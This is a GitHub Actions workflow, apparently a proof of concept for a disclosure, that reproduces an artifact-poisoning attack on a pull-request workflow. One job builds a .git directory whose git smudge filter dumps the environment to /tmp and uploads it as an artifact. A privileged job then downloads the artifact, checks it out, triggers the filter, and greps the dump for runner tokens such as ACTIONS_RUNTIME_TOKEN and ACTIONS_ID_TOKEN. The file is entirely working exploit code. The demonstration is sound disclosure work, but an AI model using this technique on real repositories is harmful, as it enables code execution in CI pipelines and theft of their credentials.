name: poc-artifact-git
on:
  workflow_dispatch:

jobs:
  collect:
    # mimics the attacker-modified 'Docs PR AI menu (collect)' workflow in a fork PR
    runs-on: ubuntu-latest
    steps:
      - name: Build malicious .git directory with filter payload
        run: |
          set -eux
          rm -rf evil art
          mkdir evil
          cd evil
          git init -q -b main .
          git config user.email poc@example.com
          git config user.name poc
          printf '%s\n' '*.dat filter=pwn' > .gitattributes
          echo 'attacker committed content' > payload.dat
          git add -A
          git commit -qm 'attacker commit'
          printf '%s\n' \
            '[core]' \
            '	repositoryformatversion = 0' \
            '	filemode = true' \
            '	bare = false' \
            '	logallrefupdates = true' \
            '[remote "origin"]' \
            '	url = https://github.com/PDFtoMark/gab-poc-gitartifact' \
            '	fetch = +refs/heads/*:refs/remotes/origin/*' \
            '[filter "pwn"]' \
            '	smudge = env > /tmp/PWN_ENV; touch /tmp/PWN_OK; cat' \
            '	clean = cat' \
            > .git/config
          cd ..
          mkdir art
          cp -r evil/.git art/.git
          echo 1 > art/pr_number.txt
      - name: Upload artifact named pr-number
        uses: actions/upload-artifact@v7
        with:
          name: pr-number
          path: art
          include-hidden-files: true

  post-menu:
    # mimics docs-pr-ai-menu.yml post-menu (workflow_run, privileged GITHUB_TOKEN)
    needs: collect
    runs-on: ubuntu-latest
    permissions:
      checks: read
      contents: read
      issues: write
      pull-requests: write
    steps:
      - name: Download PR number artifact
        uses: actions/download-artifact@v8
        with:
          name: pr-number
          run-id: ${{ github.run_id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
      - name: Resolve pull request number
        id: resolve-pr
        run: |
          echo "number=$(cat pr_number.txt)" >> "$GITHUB_OUTPUT"
      - name: Checkout repository
        uses: actions/checkout@v7.0.1
        with:
          persist-credentials: false
      - name: Prove code execution from attacker artifact
        run: |
          set -x
          ls -la /tmp/PWN_OK
          test -f /tmp/PWN_ENV && echo 'ENV CAPTURED'
          grep -oE '^(INPUT_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_CACHE_URL|ACTIONS_ID_TOKEN)[A-Z_]*' /tmp/PWN_ENV | sort -u | head -10
          git log --oneline -1
